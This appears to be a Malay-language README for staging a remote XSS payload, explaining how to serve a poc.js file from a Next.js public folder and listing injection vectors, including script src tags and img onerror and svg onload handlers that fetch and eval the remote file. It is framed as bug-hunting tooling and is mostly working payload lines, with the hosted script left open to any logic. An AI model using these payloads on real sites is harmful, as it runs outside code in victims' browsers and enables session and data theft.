# 🎯 Panduan Pengehosan Luaran (Remote Staged Payload) di saas_house

Fail ini menerangkan cara menggunakan projek **saas_house** sebagai pelayan pengehosan payload jauh (*Remote Staged Hosting*) untuk ujian keselamatan dan pemburuan pepijat (*bug hunting*).

---

## 📍 1. Lokasi Fail Fizikal
Fail payload diletakkan di dalam folder statik Next.js:
* **Laluan Folder**: `C:\Users\mypc\Desktop\saas_house\frontend\public\staged\`
* **Fail Payload Utama**: `poc.js`

Kerana ia diletakkan di dalam folder `public/` Next.js, sebarang fail di dalamnya akan disajikan terus ke web tanpa perlu membina API atau laluan (*routing*) baharu!

---

## 🌐 2. Alamat URL Akses Awam (Public Access URL)

### A. Semasa Pembangunan Tempatan (Local Testing):
Jika anda menjalankan frontend Next.js (`npm run dev` pada port 3000):
```text
http://localhost:3000/staged/poc.js
```

### B. Semasa Pelayan Hidup (Production / Cloudflare Tunnel / Ngrok):
Jika domain projek saas_house anda dihoskan di internet (contoh: `https://saashouse.my` atau melalui tunnel):
```text
https://domain-saas-house-anda.com/staged/poc.js
```

---

## 🚀 3. Contoh Cara Menyuntik Payload Jauh (Injection Vectors)

Apabila anda menemui kelemahan XSS pada sasaran, anda tidak perlu menulis kod JavaScript yang panjang. Cukup dengan memanggil fail `poc.js` ini:

### Kaedah 1: Menggunakan Tag `<script src>` Standard
```html
<script src="https://domain-saas-house-anda.com/staged/poc.js"></script>
```

### Kaedah 2: Pautan Protokol Relatif (Bypass Skim HTTP/HTTPS)
```html
<script src="//domain-saas-house-anda.com/staged/poc.js"></script>
```

### Kaedah 3: Melalui Event-Handler Dinamik (`import()` atau `fetch()`)
```html
<img src=x onerror="import('//domain-saas-house-anda.com/staged/poc.js')">
```
```html
<svg/onload="fetch('//domain-saas-house-anda.com/staged/poc.js').then(r=>r.text()).then(eval)">
```

---

## 🛡️ 4. Cara Menukar Kod Payload
Anda boleh buka fail `poc.js` pada bila-bila masa di VS Code atau Notepad, dan masukkan apa-apa logik yang anda mahukan (contohnya menukar teks `alert`, menambah diagnostik konsol, atau ujian DOM). Sebaik sahaja fail disimpan, pelayan Next.js akan menyajikan versi terbaharu secara serta-merta!
